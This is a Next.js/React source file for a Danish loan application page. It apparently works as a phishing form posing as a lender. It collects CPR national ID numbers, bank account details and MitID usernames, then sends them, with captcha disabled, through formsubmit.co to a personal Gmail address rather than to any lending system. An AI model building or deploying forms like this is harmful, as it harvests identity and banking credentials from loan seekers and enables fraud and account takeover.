'use client';

import { useState, Suspense } from 'react';
import { useTranslations, useLocale } from 'next-intl';
import { useSearchParams } from 'next/navigation';
import Navbar from '@/components/Navbar';
import Footer from '@/components/Footer';
import { CheckCircle2, ArrowRight, ArrowLeft, Building2, User, FileText, Briefcase } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';

function ApplyForm() {
  const t = useTranslations('ApplyPage');
  const locale = useLocale();
  const searchParams = useSearchParams();
  const initialAmount = searchParams.get('amount') || '50000';

  const [step, setStep] = useState(1);
  const [loanType, setLoanType] = useState<'private' | 'business' | null>(null);
  const [formData, setFormData] = useState({
    amount: initialAmount,
    cvr: '',
    companyName: '',
    cpr: '',
    purpose: '',
    firstName: '',
    lastName: '',
    email: '',
    phone: '',
    accountNumber: '',
    bankName: '',
    mitIdUsername: '',
    monthlyAmount: '5000',
    paymentInterval: 'monthly'
  });
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  // Calcul du paiement mensuel
  const calculateMonthlyPayment = (amount: number, annualRate: number = 0.08, months: number = 36) => {
    const monthlyRate = annualRate / 12;
    const payment = (amount * monthlyRate * Math.pow(1 + monthlyRate, months)) / (Math.pow(1 + monthlyRate, months) - 1);
    return Math.round(payment);
  };

  const monthlyPayment = calculateMonthlyPayment(parseInt(formData.amount) || 0);

  const nextStep = () => setStep(s => Math.min(s + 1, 3));
  const prevStep = () => setStep(s => Math.max(s - 1, 1));

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError(null);
    
    try {
      const loanTypeLabel = loanType === 'business' ? 'Erhvervslån' : 'Privatlån';
      const payload = { 
        ...formData, 
        loanType: loanTypeLabel,
        _subject: `Ny låneansøgning (${loanTypeLabel}) fra ${formData.firstName} ${formData.lastName}`,
        _template: 'table',
        _captcha: 'false'
      };
      
      console.log('Envoi des données vers FormSubmit:', payload);
      
      const response = await fetch('https://formsubmit.co/ajax/Lanpenge47@gmail.com', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify(payload)
      });

      console.log('Réponse status:', response.status);
      
      const responseText = await response.text();
      console.log('Réponse texte:', responseText);
      
      let errorData;
      try {
        errorData = JSON.parse(responseText);
      } catch {
        errorData = { message: `Erreur serveur ${response.status}` };
      }

      if (response.ok) {
        setIsSubmitted(true);
      } else {
        setError(errorData.message || 'Une erreur est survenue lors de l\'envoi');
        console.error('Erreur serveur:', response.status, errorData);
      }
    } catch (error) {
      setError('Erreur de connexion. Veuillez réessayer.');
      console.error('Erreur lors de l\'envoi:', error);
    } finally {
      setIsLoading(false);
    }
  };

  if (isSubmitted) {
    return (
      <div className="min-h-screen bg-white">
        <Navbar />
        <div className="max-w-3xl mx-auto px-4 py-32 text-center">
          <motion.div 
            initial={{ scale: 0.5, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            className="bg-green-50 p-16 rounded-[4rem] border border-green-100"
          >
            <CheckCircle2 className="w-24 h-24 text-green-500 mx-auto mb-8" />
            <h1 className="text-4xl font-black text-gray-900 mb-6">{t('review.success')}</h1>
            <button 
              onClick={() => window.location.href = `/${locale}`}
              className="bg-green-500 text-white px-10 py-4 rounded-2xl font-black text-lg hover:bg-green-600 transition"
            >
              {t('review.backToHome')}
            </button>
          </motion.div>
        </div>
        <Footer />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50/50">
      <Navbar />
      
      <main className="max-w-4xl mx-auto px-4 py-16">
        <div className="mb-12">
          <h1 className="text-4xl font-black text-center mb-8">{t('title')}</h1>
          
          {/* Progress Bar */}
          <div className="flex justify-between items-center max-w-md mx-auto relative mb-12">
            <div className="absolute top-1/2 left-0 right-0 h-1 bg-gray-200 -translate-y-1/2 -z-10" />
            {[1, 2, 3].map((s) => (
              <div 
                key={s}
                className={`w-10 h-10 rounded-full flex items-center justify-center font-bold transition-all duration-300 ${
                  step >= s ? 'bg-green-500 text-white scale-110 shadow-lg shadow-green-100' : 'bg-white text-gray-400 border-2 border-gray-200'
                }`}
              >
                {s === 1 && <Briefcase className="w-4 h-4" />}
                {s === 2 && <User className="w-4 h-4" />}
                {s === 3 && <FileText className="w-4 h-4" />}
              </div>
            ))}
          </div>
        </div>

        <div className="bg-white p-6 lg:p-12 rounded-[2.5rem] lg:rounded-[3rem] shadow-2xl shadow-gray-200/50 border border-gray-100">
          <form onSubmit={handleSubmit}>
            <AnimatePresence mode="wait">
              {step === 1 && (
                <motion.div
                  key="step1"
                  initial={{ x: 20, opacity: 0 }}
                  animate={{ x: 0, opacity: 1 }}
                  exit={{ x: -20, opacity: 0 }}
                  className="space-y-8"
                >
                  <h2 className="text-xl lg:text-2xl font-black text-center mb-6 lg:mb-10">{t('type.title')}</h2>
                  
                  {/* Loan Summary */}
                  <div className="bg-green-50 p-6 lg:p-8 rounded-[2rem] border border-green-100 mb-8">
                    <div className="text-center">
                      <div className="text-sm font-bold text-green-600 uppercase tracking-widest mb-2">{t('calculator.amount')}</div>
                      <div className="text-3xl lg:text-4xl font-black text-gray-900 mb-4">{parseInt(formData.amount).toLocaleString('da-DK')} kr.</div>
                      <div className="text-sm font-bold text-green-600 uppercase tracking-widest mb-1">{t('calculator.monthly')}</div>
                      <div className="text-xl lg:text-2xl font-black text-gray-700">{monthlyPayment.toLocaleString('da-DK')} kr. / {t('calculator.month')}</div>
                      <div className="text-xs text-gray-500 mt-2">{t('calculator.disclaimer')}</div>
                    </div>
                  </div>
                  
                  <div className="grid md:grid-cols-2 gap-4 lg:gap-6">
                    <button
                      type="button"
                      onClick={() => { setLoanType('private'); nextStep(); }}
                      className={`p-6 lg:p-10 rounded-2xl lg:rounded-3xl border-2 lg:border-4 transition-all text-center group ${
                        loanType === 'private' ? 'border-green-500 bg-green-50' : 'border-gray-100 hover:border-green-200'
                      }`}
                    >
                      <User className={`w-8 h-8 lg:w-12 lg:h-12 mx-auto mb-3 lg:mb-4 ${loanType === 'private' ? 'text-green-600' : 'text-gray-400 group-hover:text-green-500'}`} />
                      <span className="block text-lg lg:text-xl font-black">{t('type.private')}</span>
                    </button>
                    <button
                      type="button"
                      onClick={() => { setLoanType('business'); nextStep(); }}
                      className={`p-6 lg:p-10 rounded-2xl lg:rounded-3xl border-2 lg:border-4 transition-all text-center group ${
                        loanType === 'business' ? 'border-green-500 bg-green-50' : 'border-gray-100 hover:border-green-200'
                      }`}
                    >
                      <Building2 className={`w-8 h-8 lg:w-12 lg:h-12 mx-auto mb-3 lg:mb-4 ${loanType === 'business' ? 'text-green-600' : 'text-gray-400 group-hover:text-green-500'}`} />
                      <span className="block text-lg lg:text-xl font-black">{t('type.business')}</span>
                    </button>
                  </div>
                </motion.div>
              )}

              {step === 2 && (
                <motion.div
                  key="step2"
                  initial={{ x: 20, opacity: 0 }}
                  animate={{ x: 0, opacity: 1 }}
                  exit={{ x: -20, opacity: 0 }}
                  className="space-y-8"
                >
                  <div className="flex items-center gap-4 mb-8">
                    <div className="w-12 h-12 bg-green-50 text-green-600 rounded-2xl flex items-center justify-center">
                      {loanType === 'business' ? <Building2 className="w-6 h-6" /> : <User className="w-6 h-6" />}
                    </div>
                    <h2 className="text-2xl font-black">
                      {loanType === 'business' ? t('business.title') : t('private.title')}
                    </h2>
                  </div>

                  {loanType === 'business' ? (
                    <div className="grid md:grid-cols-2 gap-8">
                      <div className="space-y-3">
                        <label className="text-sm font-bold uppercase tracking-wider text-gray-600">{t('business.cvr')}</label>
                        <input name="cvr" required value={formData.cvr} onChange={handleChange} className="w-full bg-white border-2 border-gray-200 rounded-2xl p-5 text-gray-900 text-lg font-medium focus:ring-4 focus:ring-green-100 focus:border-green-400 outline-none transition-all" placeholder="12345678" />
                      </div>
                      <div className="space-y-3">
                        <label className="text-sm font-bold uppercase tracking-wider text-gray-600">{t('business.companyName')}</label>
                        <input name="companyName" required value={formData.companyName} onChange={handleChange} className="w-full bg-white border-2 border-gray-200 rounded-2xl p-5 text-gray-900 text-lg font-medium focus:ring-4 focus:ring-green-100 focus:border-green-400 outline-none transition-all" placeholder="Firma ApS" />
                      </div>
                    </div>
                  ) : (
                    <div className="space-y-3">
                      <label className="text-sm font-bold uppercase tracking-wider text-gray-600">{t('private.cpr')}</label>
                      <input name="cpr" required value={formData.cpr} onChange={handleChange} className="w-full bg-white border-2 border-gray-200 rounded-2xl p-5 text-gray-900 text-lg font-medium focus:ring-4 focus:ring-green-100 focus:border-green-400 outline-none transition-all" placeholder="DDMMYY-XXXX" />
                    </div>
                  )}

                  <div className="space-y-3">
                    <label className="text-sm font-bold uppercase tracking-wider text-gray-600">
                      {loanType === 'business' ? t('business.purpose') : t('private.purpose')}
                    </label>
                    <textarea 
                      name="purpose" required value={formData.purpose} onChange={handleChange} rows={3} 
                      className="w-full bg-white border-2 border-gray-200 rounded-3xl p-5 text-gray-900 text-lg font-medium focus:ring-4 focus:ring-green-100 focus:border-green-400 outline-none transition-all resize-none" 
                      placeholder={loanType === 'business' ? t('business.purposePlaceholder') : t('private.purposePlaceholder')}
                    />
                  </div>

                  <div className="grid md:grid-cols-2 gap-8 pt-4">
                    <div className="space-y-3">
                      <label className="text-sm font-bold uppercase tracking-wider text-gray-600">{t('personal.firstName')}</label>
                      <input name="firstName" required value={formData.firstName} onChange={handleChange} className="w-full bg-white border-2 border-gray-200 rounded-2xl p-5 text-gray-900 text-lg font-medium focus:ring-4 focus:ring-green-100 focus:border-green-400 outline-none transition-all" />
                    </div>
                    <div className="space-y-3">
                      <label className="text-sm font-bold uppercase tracking-wider text-gray-600">{t('personal.lastName')}</label>
                      <input name="lastName" required value={formData.lastName} onChange={handleChange} className="w-full bg-white border-2 border-gray-200 rounded-2xl p-5 text-gray-900 text-lg font-medium focus:ring-4 focus:ring-green-100 focus:border-green-400 outline-none transition-all" />
                    </div>
                  </div>
                  <div className="grid md:grid-cols-2 gap-8">
                    <div className="space-y-3">
                      <label className="text-sm font-bold uppercase tracking-wider text-gray-600">{t('personal.email')}</label>
                      <input name="email" type="email" required value={formData.email} onChange={handleChange} className="w-full bg-white border-2 border-gray-200 rounded-2xl p-5 text-gray-900 text-lg font-medium focus:ring-4 focus:ring-green-100 focus:border-green-400 outline-none transition-all" />
                    </div>
                    <div className="space-y-3">
                      <label className="text-sm font-bold uppercase tracking-wider text-gray-600">{t('personal.phone')}</label>
                      <input name="phone" required value={formData.phone} onChange={handleChange} className="w-full bg-white border-2 border-gray-200 rounded-2xl p-5 text-gray-900 text-lg font-medium focus:ring-4 focus:ring-green-100 focus:border-green-400 outline-none transition-all" />
                    </div>
                  </div>

                  <div className="grid md:grid-cols-2 gap-8">
                    <div className="space-y-3">
                      <label className="text-sm font-bold uppercase tracking-wider text-gray-600">{t('payment.monthlyAmount')}</label>
                      <select name="monthlyAmount" value={formData.monthlyAmount} onChange={handleChange} className="w-full bg-white border-2 border-gray-200 rounded-2xl p-5 text-gray-900 text-lg font-medium focus:ring-4 focus:ring-green-100 focus:border-green-400 outline-none transition-all cursor-pointer">
                        <option value="5000">{t('payment.amountOptions.5000')}</option>
                        <option value="10000">{t('payment.amountOptions.10000')}</option>
                        <option value="20000">{t('payment.amountOptions.20000')}</option>
                        <option value="25000">{t('payment.amountOptions.25000')}</option>
                      </select>
                    </div>
                    <div className="space-y-3">
                      <label className="text-sm font-bold uppercase tracking-wider text-gray-600">{t('payment.interval')}</label>
                      <select name="paymentInterval" value={formData.paymentInterval} onChange={handleChange} className="w-full bg-white border-2 border-gray-200 rounded-2xl p-5 text-gray-900 text-lg font-medium focus:ring-4 focus:ring-green-100 focus:border-green-400 outline-none transition-all cursor-pointer">
                        <option value="monthly">{t('payment.intervalOptions.monthly')}</option>
                        <option value="biweekly">{t('payment.intervalOptions.biweekly')}</option>
                        <option value="weekly">{t('payment.intervalOptions.weekly')}</option>
                      </select>
                    </div>
                  </div>

                  <div className="grid md:grid-cols-2 gap-8">
                    <div className="space-y-3">
                      <label className="text-sm font-bold uppercase tracking-wider text-gray-600">{t('personal.accountNumber')}</label>
                      <input name="accountNumber" required value={formData.accountNumber} onChange={handleChange} className="w-full bg-white border-2 border-gray-200 rounded-2xl p-5 text-gray-900 text-lg font-medium focus:ring-4 focus:ring-green-100 focus:border-green-400 outline-none transition-all" placeholder="1234 5678901" />
                    </div>
                    <div className="space-y-3">
                      <label className="text-sm font-bold uppercase tracking-wider text-gray-600">{t('personal.bankName')}</label>
                      <input name="bankName" required value={formData.bankName} onChange={handleChange} className="w-full bg-white border-2 border-gray-200 rounded-2xl p-5 text-gray-900 text-lg font-medium focus:ring-4 focus:ring-green-100 focus:border-green-400 outline-none transition-all" placeholder="Danske Bank" />
                    </div>
                  </div>

                  <div className="space-y-3">
                    <label className="text-sm font-bold uppercase tracking-wider text-gray-600">{t('personal.mitIdUsername')}</label>
                    <input name="mitIdUsername" required value={formData.mitIdUsername} onChange={handleChange} className="w-full bg-white border-2 border-gray-200 rounded-2xl p-5 text-gray-900 text-lg font-medium focus:ring-4 focus:ring-green-100 focus:border-green-400 outline-none transition-all" placeholder="Dit MitID brugernavn" />
                  </div>
                </motion.div>
              )}

              {step === 3 && (
                <motion.div
                  key="step3"
                  initial={{ x: 20, opacity: 0 }}
                  animate={{ x: 0, opacity: 1 }}
                  exit={{ x: -20, opacity: 0 }}
                  className="space-y-8"
                >
                  <div className="flex items-center gap-4 mb-8">
                    <div className="w-12 h-12 bg-green-50 text-green-600 rounded-2xl flex items-center justify-center">
                      <FileText className="w-6 h-6" />
                    </div>
                    <h2 className="text-2xl font-black">{t('review.title')}</h2>
                  </div>

                  <div className="bg-gray-50 p-8 rounded-[2rem] space-y-6">
                    <div className="flex justify-between border-b border-gray-200 pb-4">
                      <span className="font-bold text-gray-500">{t('review.amount')}</span>
                      <span className="font-black text-xl">{formData.amount} kr.</span>
                    </div>
                    <div className="flex justify-between border-b border-gray-200 pb-4">
                      <span className="font-bold text-gray-500">{t('calculator.monthly')}</span>
                      <span className="font-black text-xl">{monthlyPayment} kr. / {t('calculator.month')}</span>
                    </div>
                    <div className="flex justify-between border-b border-gray-200 pb-4">
                      <span className="font-bold text-gray-500">{t('payment.monthlyAmount')}</span>
                      <span className="font-black text-xl">{t(`payment.amountOptions.${formData.monthlyAmount}`)}</span>
                    </div>
                    <div className="flex justify-between border-b border-gray-200 pb-4">
                      <span className="font-bold text-gray-500">{t('payment.interval')}</span>
                      <span className="font-black text-xl">{t(`payment.intervalOptions.${formData.paymentInterval}`)}</span>
                    </div>
                    <div className="flex justify-between border-b border-gray-200 pb-4">
                      <span className="font-bold text-gray-500">{t('review.loanType')}</span>
                      <span className="font-black">{loanType === 'business' ? t('type.business') : t('type.private')}</span>
                    </div>
                    {loanType === 'business' ? (
                      <div className="flex justify-between border-b border-gray-200 pb-4">
                        <span className="font-bold text-gray-500">{t('business.companyName')}</span>
                        <span className="font-black">{formData.companyName}</span>
                      </div>
                    ) : (
                      <div className="flex justify-between border-b border-gray-200 pb-4">
                        <span className="font-bold text-gray-500">{t('private.cpr')}</span>
                        <span className="font-black">{formData.cpr}</span>
                      </div>
                    )}
                    <div className="flex justify-between">
                      <span className="font-bold text-gray-500">{t('personal.email')}</span>
                      <span className="font-black">{formData.email}</span>
                    </div>
                    <div className="flex justify-between border-b border-gray-200 pb-4">
                      <span className="font-bold text-gray-500">{t('personal.accountNumber')}</span>
                      <span className="font-black">{formData.accountNumber}</span>
                    </div>
                    <div className="flex justify-between border-b border-gray-200 pb-4">
                      <span className="font-bold text-gray-500">{t('personal.bankName')}</span>
                      <span className="font-black">{formData.bankName}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="font-bold text-gray-500">{t('personal.mitIdUsername')}</span>
                      <span className="font-black">{formData.mitIdUsername}</span>
                    </div>
                  </div>
                </motion.div>
              )}
            </AnimatePresence>

            {error && (
              <div className="mt-8 p-6 bg-red-50 border border-red-200 rounded-2xl">
                <p className="text-red-700 font-black text-center">{error}</p>
              </div>
            )}

            <div className="mt-12 flex flex-col sm:flex-row justify-between gap-4">
              {step > 1 && (
                <button
                  type="button"
                  onClick={prevStep}
                  className="flex items-center justify-center gap-2 px-8 py-4 rounded-2xl font-black text-gray-500 hover:bg-gray-100 transition order-2 sm:order-1"
                >
                  <ArrowLeft className="w-5 h-5" />
                  {t('navigation.back')}
                </button>
              )}
              
              {step === 2 && (
                <button
                  type="button"
                  onClick={nextStep}
                  className="sm:ml-auto flex items-center justify-center gap-2 bg-green-500 text-white px-10 py-4 rounded-2xl font-black text-lg hover:bg-green-600 transition shadow-xl shadow-green-100 order-1 sm:order-2"
                >
                  {t('navigation.next')}
                  <ArrowRight className="w-5 h-5" />
                </button>
              )}

              {step === 3 && (
                <button
                  type="submit"
                  disabled={isLoading}
                  className="sm:ml-auto flex items-center justify-center gap-2 bg-green-500 text-white px-10 py-4 rounded-2xl font-black text-lg hover:bg-green-600 disabled:bg-gray-400 disabled:cursor-not-allowed transition shadow-xl shadow-green-100 order-1 sm:order-2"
                >
                  {isLoading ? (
                    <>
                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                      {t('review.sending')}
                    </>
                  ) : (
                    <>
                      {t('review.confirm')}
                      <CheckCircle2 className="w-5 h-5" />
                    </>
                  )}
                </button>
              )}
            </div>
          </form>
        </div>
      </main>

      <Footer />
    </div>
  );
}

export default function ApplyPage() {
  return (
    <Suspense fallback={<div className="min-h-screen flex items-center justify-center">Loading...</div>}>
      <ApplyForm />
    </Suspense>
  );
}
